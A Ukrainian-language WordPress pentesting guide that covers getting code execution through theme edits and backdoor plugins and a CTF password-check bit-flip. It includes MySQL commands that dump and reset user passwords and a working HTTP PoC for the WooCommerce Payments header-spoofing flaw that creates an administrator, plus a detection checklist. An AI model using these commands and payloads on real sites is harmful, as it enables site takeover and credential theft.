## –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –±—ñ—Ç

–ë—ñ–ª—å—à–µ —Å—Ö–æ–∂–µ –Ω–∞ —Ü—ñ–∫–∞–≤–∏–Ω–∫—É, –Ω—ñ–∂ –Ω–∞ —Ä–µ–∞–ª—å–Ω—É –∞—Ç–∞–∫—É. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) –º–æ–∂–Ω–∞ –±—É–ª–æ –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç–∏ 1 –±—ñ—Ç —É –±—É–¥—å-—è–∫–æ–º—É wordpress —Ñ–∞–π–ª—ñ. –¢–æ–º—É –º–æ–∂–Ω–∞ –±—É–ª–æ –∑–º—ñ–Ω–∏—Ç–∏ –±—ñ—Ç –Ω–∞ –ø–æ–∑–∏—Ü—ñ—ó `5389` —É —Ñ–∞–π–ª—ñ `/var/www/html/wp-includes/user.php`, —â–æ–± –∑–∞–º—ñ–Ω–∏—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—é NOT (`!`) –Ω–∞ NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **–ü–∞–Ω–µ–ª—å RCE**

**–ó–º—ñ–Ω–∞ php-—Ñ–∞–π–ª—É —Ç–µ–º–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è (admin credentials needed)**

–ó–æ–≤–Ω—ñ—à–Ω—ñ–π –≤–∏–≥–ª—è–¥ ‚Üí –†–µ–¥–∞–∫—Ç–æ—Ä —Ç–µ–º ‚Üí 404 Template (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

–ü–æ—à—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
—â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Å—ñ—é.

## –ü–ª–∞–≥—ñ–Ω RCE

### PHP –ø–ª–∞–≥—ñ–Ω

–ú–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ .php —Ñ–∞–π–ª–∏ —è–∫ –ø–ª–∞–≥—ñ–Ω.\
–°—Ç–≤–æ—Ä—ñ—Ç—å –≤–∞—à php backdoor, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../images/image (183).png>)

–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π –ø–ª–∞–≥—ñ–Ω:

![](<../../images/image (722).png>)

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø–ª–∞–≥—ñ–Ω —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å Install Now:

![](<../../images/image (249).png>)

–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ Procced:

![](<../../images/image (70).png>)

–ô–º–æ–≤—ñ—Ä–Ω–æ, —Ü–µ –Ω—ñ—á–æ–≥–æ –Ω–µ –ø–æ–∫–∞–∂–µ, –∞–ª–µ —è–∫—â–æ –ø–µ—Ä–µ–π—Ç–∏ –≤ Media, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π shell:

![](<../../images/image (462).png>)

–í—ñ–¥–∫—Ä–∏–≤—à–∏ –π–æ–≥–æ, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ URL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

–¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞, –≤—ñ–¥–æ–º–æ–≥–æ —Å–≤–æ—î—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, —è–∫–∏–π –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è web shell. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ WordPress dashboard —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:

1. **–û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**: –ø–ª–∞–≥—ñ–Ω –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ –¥–∂–µ—Ä–µ–ª–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ Exploit DB, —è–∫ [**here**](https://www.exploit-db.com/exploits/36374).
2. **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**:
- –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ WordPress dashboard, –ø–æ—Ç—ñ–º –≤ `Dashboard > Plugins > Upload Plugin`.
- –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ zip-—Ñ–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞.
3. **–ê–∫—Ç–∏–≤–∞—Ü—ñ—è –ø–ª–∞–≥—ñ–Ω–∞**: –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ dashboard.
4. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**:
- –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω "reflex-gallery" –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤—ñ–¥–æ–º–∏–π —Å–≤–æ—î—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é.
- Metasploit framework –Ω–∞–¥–∞—î –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –º–æ–¥—É–ª—å —Ç–∞ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –ø–µ–≤–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ meterpreter —Å–µ—Å—ñ—é, —â–æ –Ω–∞–¥–∞—Å—Ç—å –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–∞–π—Ç—É.
- –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ —Ü–µ –ª–∏—à–µ –æ–¥–∏–Ω —ñ–∑ –±–∞–≥–∞—Ç—å–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó WordPress —Å–∞–π—Ç—É.

–£ –º–∞—Ç–µ—Ä—ñ–∞–ª—ñ –ø—Ä–∏—Å—É—Ç–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –∫—Ä–æ–∫–∏ –≤ WordPress dashboard –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —Ç–∞ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ –ª–∏—à–µ –≤ –ø—Ä–∞–≤–æ–≤–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥ —á–∞—Å penetration testing —ñ–∑ —è–≤–Ω–∏–º –¥–æ–∑–≤–æ–ª–æ–º.

**–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–∏—Ö –∫—Ä–æ–∫—ñ–≤ –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## –í—ñ–¥ XSS –¥–æ RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ‚Äî —Å–∫—Ä–∏–ø—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –µ—Å–∫–∞–ª–∞—Ü—ñ—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ **Cross-Site Scripting (XSS)** –¥–æ **Remote Code Execution (RCE)** –∞–±–æ —ñ–Ω—à–∏—Ö –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É WordPress. –î–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–∏–≤. [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). –í—ñ–Ω **–ø—ñ–¥—Ç—Ä–∏–º—É—î Wordpress –≤–µ—Ä—Å—ñ—ó 6.X.X, 5.X.X —Ç–∞ 4.X.X —ñ –¥–æ–∑–≤–æ–ª—è—î:**
- _**Privilege Escalation:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–∞—à –≤–ª–∞—Å–Ω–∏–π –ø–ª–∞–≥—ñ–Ω (backdoor) —É WordPress.
- _**(RCE) Built-In Plugin Edit:**_ –†–µ–¥–∞–≥—É–≤–∞—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —É WordPress.
- _**(RCE) Built-In Theme Edit:**_ –†–µ–¥–∞–≥—É–≤–∞—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ç–µ–º–∏ —É WordPress.
- _**(Custom) Custom Exploits:**_ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ WordPress.

## Post Exploitation

–í–∏—Ç—è–≥—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### –ü–æ–≤–µ—Ä—Ö–Ω—è –∞—Ç–∞–∫–∏

–ó–Ω–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ Wordpress –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É —Ü—ñ–π —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å —É –Ω–∞–≤–µ–¥–µ–Ω–∏—Ö –Ω–∏–∂—á–µ –ø—É–Ω–∫—Ç–∞—Ö —Ç–∞ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ –≤ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ ‚Äî —á–µ—Ä–µ–∑ AJAX handlers. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–º–∏–ª–∫–∏ –≤ –ª–æ–≥—ñ—Ü—ñ, authorization –∞–±–æ authentication. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —á–∞—Å—Ç–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±–∞–∑—É–≤–∞—Ç–∏–º—É—Ç—å —è–∫ authentication, —Ç–∞–∫ —ñ authorization –Ω–∞ —ñ—Å–Ω—É–≤–∞–Ω–Ω—ñ wordpress nonce, —è–∫–∏–π **–±—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ Wordpress, –º–æ–∂–µ –º–∞—Ç–∏** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ä–æ–ª—ñ).

–¶–µ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–ª–∞–≥—ñ–Ω—ñ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å endpoint –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —É–≤—ñ–π—à–æ–≤ —É —Å–∏—Å—Ç–µ–º—É, –≤–æ–Ω–∞ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ‚Äî callback-—Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —É–ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω–∏–π –ø–µ–≤–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –º–µ—Ç–æ–¥ API.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **–ü—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ php-—Ñ–∞–π–ª—É**

–ó–≤—ñ—Å–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ—Å—Ç—É–ø–Ω—ñ –∑ –≤–µ–±—É. –¢–æ–º—É, —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±—É–¥—å-—è–∫—É –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ —Ñ–∞–π–ª—É, —ó—ó –∑–º–æ–∂–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å ¬´trusted header¬ª —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è –¥–ª—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ–π –∞–±–æ reverse proxy —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π header –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è REST-–∑–∞–ø–∏—Ç—ñ–≤. –Ø–∫—â–æ header –Ω–µ –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ –¥–æ –∑–∞–ø–∏—Ç—É –Ω–∞ upstream-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–ø—É—Ñ–∏—Ç–∏ –π–æ–≥–æ –π –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö REST –º–∞—Ä—à—Ä—É—Ç—ñ–≤ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä.

- Impact: –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ admin —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (–ø—Ä–∏–º—É—à—É—î user ID 1, –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä—à–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î

- –ü–ª–∞–≥—ñ–Ω –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î header, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º, –Ω–∞ —Å—Ç–∞–Ω –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability.
- WordPress core –æ—á—ñ–∫—É—î –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å `create_users` –¥–ª—è —Ü—å–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç—É; —Ö–∞–∫ –ø–ª–∞–≥—ñ–Ω–∞ –æ–±—Ö–æ–¥–∏—Ç—å —ó—ó, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞.

–û—á—ñ–∫—É–≤–∞–Ω—ñ –æ–∑–Ω–∞–∫–∏ —É—Å–ø—ñ—Ö—É

- HTTP 201 –∑ JSON-—Ç—ñ–ª–æ–º, —â–æ –æ–ø–∏—Å—É—î —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –ù–æ–≤–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–º—ñ—Ç–Ω–∏–π —É `wp-admin/users.php`.

–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è

- Grep –¥–ª—è `getallheaders()`, `$_SERVER['HTTP_...']`, –∞–±–æ vendor SDKs, —è–∫—ñ —á–∏—Ç–∞—é—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó REST –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö callback-—ñ–≤, —è–∫—ñ –Ω–µ –º–∞—é—Ç—å –Ω–∞–¥—ñ–π–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `permission_callback` —ñ –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø–∏—Ç—É.
- –®—É–∫–∞–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è core-—Ñ—É–Ω–∫—Ü—ñ–π —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ (`wp_insert_user`, `wp_create_user`) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ REST-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤, —è–∫—ñ —î –æ–±–º–µ–∂–µ–Ω–∏–º–∏ —Ç—ñ–ª—å–∫–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

–ü–æ—Å–∏–ª–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏

